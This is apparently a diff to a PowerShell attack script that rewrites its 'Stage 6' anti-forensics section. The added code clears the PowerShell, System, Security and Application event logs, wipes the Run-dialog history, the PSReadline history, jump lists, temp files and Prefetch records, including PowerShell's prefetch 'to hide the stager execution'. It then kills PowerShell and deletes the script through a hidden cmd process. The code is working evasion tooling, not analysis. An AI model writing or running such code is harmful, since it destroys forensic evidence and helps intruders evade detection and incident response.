@@ -144,37 +144,105 @@ catch {
     Write-Warning "Critical Error: $($_.Exception.Message)"
 }
 
-finally {
-    # --- STAGE 6: AGGRESSIVE ANTI-FORENSICS & LOG WIPING ---
+# finally {
+#     # --- STAGE 6: AGGRESSIVE ANTI-FORENSICS & LOG WIPING ---
     
-    # 1. Clear the PowerShell Script Block Logs (where the code is recorded)
-    # This targets the specific log where AMSI and PowerShell record your script
+#     # 1. Clear the PowerShell Script Block Logs (where the code is recorded)
+#     # This targets the specific log where AMSI and PowerShell record your script
+#     try {
+#         $v_logName = "Microsoft-Windows-PowerShell/Operational"
+#         [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
+#     } catch { }
+
+#     # 2. Clear System, Security, and Application Logs
+#     # This is the "Nuclear Option" that wipes the main Windows history
+#     $v_logs = @("System", "Application", "Security")
+#     foreach ($v_log in $v_logs) {
+#         try {
+#             Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
+#         } catch { }
+#     }
+
+#     # 3. Wipe Temp Files (Lab Patterns)
+#     # Targeted wiping of any remaining lab files in TEMP using filename patterns
+#     Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
+#         Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
+#         Remove-Item -Force -ErrorAction SilentlyContinue
+
+#     # 4. SELF-DESTRUCT (Script Deletion)
+#     $v_currentScript = $MyInvocation.MyCommand.Definition
+#     if ($v_currentScript) {
+#         # 'timeout 3' gives PowerShell time to close the file handle
+#         # 'taskkill' ensures no leftover powershell processes keep a lock
+#         $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
+#         Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
+#     }
+# }
+
+finally {
+    # --- STAGE 6: AGGRESSIVE ANTI-FORENSICS & ARTIFACT WIPE ---
+
+    # 1. LOG WIPING (Event Viewer)
+    # Clear PowerShell Operational logs (Script Block Logging/AMSI records)
     try {
         $v_logName = "Microsoft-Windows-PowerShell/Operational"
         [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($v_logName)
     } catch { }
 
-    # 2. Clear System, Security, and Application Logs
-    # This is the "Nuclear Option" that wipes the main Windows history
+    # Clear primary Windows logs (System, Security, Application) - Requires Admin
     $v_logs = @("System", "Application", "Security")
     foreach ($v_log in $v_logs) {
-        try {
-            Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue
-        } catch { }
+        try { Clear-EventLog -LogName $v_log -ErrorAction SilentlyContinue } catch { }
     }
 
-    # 3. Wipe Temp Files (Lab Patterns)
-    # Targeted wiping of any remaining lab files in TEMP using filename patterns
+    # 2. SHELL & COMMAND HISTORY (Registry and Jump Lists)
+    # Clear Windows Run Dialog (Win+R) MRU History
+    $v_runRegistry = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+    if (Test-Path $v_runRegistry) {
+        Remove-ItemProperty -Path $v_runRegistry -Name * -ErrorAction SilentlyContinue
+    }
+
+    # Clear PowerShell Persistent History File (PSReadline)
+    try {
+        $v_hPath = (Get-PSReadlineOption).HistorySavePath
+        if (Test-Path $v_hPath) { Clear-Content $v_hPath -Force }
+    } catch { }
+
+    # Clear Taskbar Jump Lists (Recent Items)
+    $v_jumpList = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
+    if (Test-Path $v_jumpList) {
+        Get-ChildItem $v_jumpList -Filter "*.automaticDestinations-ms" | Remove-Item -Force -ErrorAction SilentlyContinue
+    }
+
+    # 3. FILE SYSTEM CLEANUP (Temp Folder)
+    # Wipe specific lab patterns from the TEMP directory
     Get-ChildItem "$env:TEMP\*" -Include "*.exe","*.txt","*.zip","*.tmp" | 
         Where-Object { $_.Name -like "*$r_nm*" -or $_.Name -like "ani_*" } | 
         Remove-Item -Force -ErrorAction SilentlyContinue
 
-    # 4. SELF-DESTRUCT (Script Deletion)
+    # 4. SELF-DESTRUCT & SESSION TERMINATION
+    # Clear current session memory history
+    Clear-History -ErrorAction SilentlyContinue
+
     $v_currentScript = $MyInvocation.MyCommand.Definition
     if ($v_currentScript) {
-        # 'timeout 3' gives PowerShell time to close the file handle
-        # 'taskkill' ensures no leftover powershell processes keep a lock
+        # CMD logic: Wait 3s -> Kill PS processes -> Delete the script file
         $v_cleanupCmd = "/c timeout 3 & taskkill /F /IM powershell.exe & del `"$v_currentScript`""
         Start-Process "cmd.exe" -ArgumentList $v_cleanupCmd -WindowStyle Hidden
     }
+
+    # 5. PREFETCH WIPING (Execution Artifacts)
+    # This removes the record that your randomized .exe was ever launched.
+    try {
+        $v_prefetchPath = "$env:SystemRoot\Prefetch"
+        if (Test-Path $v_prefetchPath) {
+            # Find any .pf file that matches your random filename pattern
+            Get-ChildItem -Path $v_prefetchPath -Filter "*$r_nm*.pf" | 
+                Remove-Item -Force -ErrorAction SilentlyContinue
+            
+            # Optionally clear the PowerShell prefetch to hide the stager execution
+            Get-ChildItem -Path $v_prefetchPath -Filter "POWERSHELL.EXE*.pf" | 
+                Remove-Item -Force -ErrorAction SilentlyContinue
+        }
+    } catch { }
 }
